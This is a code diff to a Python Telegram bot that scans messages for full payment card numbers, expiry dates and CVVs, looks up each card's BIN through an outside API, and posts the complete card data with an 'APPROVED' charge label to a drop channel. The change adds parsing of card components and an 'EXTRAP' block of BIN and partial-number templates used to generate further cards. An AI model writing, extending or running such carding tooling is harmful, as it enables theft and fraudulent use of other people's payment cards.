@@ -15,7 +15,7 @@ BIN_API_URL = 'https://astroboyapi.com/api/bin.php?bin={}'
 
 def filter_cards(text):
     try:
-        regex = r'\b\d{15,16}\D*\d{2}\D*\d{2,4}\D*\d{3,4}\b'
+        regex = r'\b(\d{15,16})\D*(\d{2})\D*(\d{2,4})\D*(\d{3,4})\b'
         matches = re.findall(regex, text)
         print(f"Filtered cards: {matches}")
         return matches
@@ -45,10 +45,13 @@ async def approved(client_instance, message):
                 print("No valid card information found in message.")
                 return
 
-            for card_info in filtered_card_info:
+            for card in filtered_card_info:
                 try:
+                    # Extract individual components from card tuple
+                    card_number, month, year, cvv = card
+
                     # Perform BIN lookup
-                    bin_number = card_info[:6]
+                    bin_number = card_number[:6]
                     bin_info = await bin_lookup(bin_number)
                     if bin_info:
                         brand = bin_info.get("brand", "N/A")
@@ -62,8 +65,11 @@ async def approved(client_instance, message):
                             "┏━━━━━━━⍟\n"
                             "┃**#CHARGE 1$ ✅**\n"
                             "┗━━━━━━━━━━━⊛\n\n"
-                            f"**𝖢𝖠𝖱𝖣** ➠ <code>{card_info}</code>\n\n"
-                            f"**𝖲𝖳𝖠𝖳𝖴𝖲** ➠ <b>**APPROVED**! ✅</b>\n\n"
+                            "**EXTRAP  ➠**\n"
+                            f"{bin_number}|{month}|{year}|{cvv}\n"
+                            f"{card_number[:8]}|{month}|{year}|{cvv}\n\n"
+                            f"**𝖢𝖠𝖱𝖣** ➠ <code>{card_number}|{month}|{year}|{cvv}</code>\n\n"
+                            f"**𝖲𝖳𝖠𝖳𝖴𝖲** ➠ <b>APPROVED! ✅</b>\n\n"
                             f"**𝖡𝖨𝖭** ➠ <b>{brand}, {card_type}, {level}</b>\n\n"
                             f"**𝖡𝖠𝖭𝖪** ➠ <b>{bank}</b>\n\n"
                             f"**𝖢𝖮𝖴𝖭𝖳𝖱𝖸** ➠ <b>{country}, {country_flag}</b>\n\n"
@@ -74,7 +80,7 @@ async def approved(client_instance, message):
                         await client_instance.send_message(chat_id='@CHARGECCDROP', text=formatted_message)
                         print("Message sent to channel successfully.")
                 except Exception as e:
-                    print(f"Error processing card info {card_info}: {e}")
+                    print(f"Error processing card info {card}: {e}")
     except Exception as e:
         print(f"An error occurred in approved function: {e}")
 
@@ -91,3 +97,4 @@ try:
     app.run()
 except Exception as e:
     print(f"Error starting the bot: {e}")
+    
